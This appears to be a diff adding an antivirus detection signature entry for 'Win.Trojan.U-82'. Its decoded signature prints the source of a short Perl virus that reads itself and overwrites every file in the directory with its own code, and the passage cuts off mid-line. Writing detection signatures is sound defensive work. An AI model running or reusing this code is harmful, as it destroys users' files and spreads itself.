@@ -1,0 +1,15 @@
+VIRUS NAME: Win.Trojan.U-82
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+/bin/perl
+
+ open(File,$0);
+ @Virus=<File>;
+ close(File);
+
+ foreach $FileName (<*>)
+ {
+  open(File, ">$FileName");
+  print File @Virus;
+  close (
